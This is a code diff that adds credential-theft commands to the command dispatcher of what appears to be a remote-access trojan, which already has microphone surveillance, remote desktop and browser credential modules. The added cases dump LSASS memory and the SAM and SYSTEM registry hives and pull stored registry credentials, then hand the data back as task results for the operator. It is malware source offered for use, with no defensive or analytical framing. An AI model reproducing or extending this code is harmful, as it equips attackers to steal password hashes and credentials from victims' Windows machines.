@@ -20,6 +20,7 @@
 #include "../../include/surveillance/microphone.h"
 #include "../../include/remote/desktop.h"
 #include "../../include/credentials/browser.h"
+#include "../../include/credentials/lsass.h"
 
 /* ============================================================================
  * Parser JSON minimal
@@ -175,6 +176,14 @@ static command_type_t string_to_command(const char *cmd) {
     return CMD_BROWSER_CREDS;
   if (str_icmp(cmd, "browser_cookies") == 0)
     return CMD_BROWSER_COOKIES;
+  if (str_icmp(cmd, "lsass_dump") == 0)
+    return CMD_LSASS_DUMP;
+  if (str_icmp(cmd, "sam_dump") == 0)
+    return CMD_SAM_DUMP;
+  if (str_icmp(cmd, "system_dump") == 0)
+    return CMD_SYSTEM_DUMP;
+  if (str_icmp(cmd, "reg_creds") == 0)
+    return CMD_REG_CREDS;
 
   return CMD_NONE;
 }
@@ -589,6 +598,72 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
         status = STATUS_SUCCESS;
       } else {
         result->output = str_dup("Failed to extract browser cookies");
+        result->output_len = result->output ? strlen(result->output) : 0;
+        status = STATUS_FAILURE;
+      }
+    }
+    break;
+
+  case CMD_LSASS_DUMP:
+    {
+      BYTE* dump_data = NULL;
+      DWORD dump_size = 0;
+      if (Lsass_Dump(&dump_data, &dump_size)) {
+        result->data = dump_data;
+        result->data_len = dump_size;
+        result->output = str_dup("LSASS dump successful");
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("LSASS dump failed (need admin privileges)");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_SAM_DUMP:
+    {
+      BYTE* sam_data = NULL;
+      DWORD sam_size = 0;
+      if (Registry_DumpSAM(&sam_data, &sam_size)) {
+        result->data = sam_data;
+        result->data_len = sam_size;
+        result->output = str_dup("SAM dump successful");
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("SAM dump failed (need admin privileges)");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_SYSTEM_DUMP:
+    {
+      BYTE* sys_data = NULL;
+      DWORD sys_size = 0;
+      if (Registry_DumpSYSTEM(&sys_data, &sys_size)) {
+        result->data = sys_data;
+        result->data_len = sys_size;
+        result->output = str_dup("SYSTEM dump successful");
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("SYSTEM dump failed (need admin privileges)");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_REG_CREDS:
+    {
+      char* creds_json = NULL;
+      if (Registry_GetStoredCredentials(&creds_json)) {
+        result->output = creds_json;
+        result->output_len = creds_json ? strlen(creds_json) : 0;
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to extract registry credentials");
         result->output_len = result->output ? strlen(result->output) : 0;
         status = STATUS_FAILURE;
       }
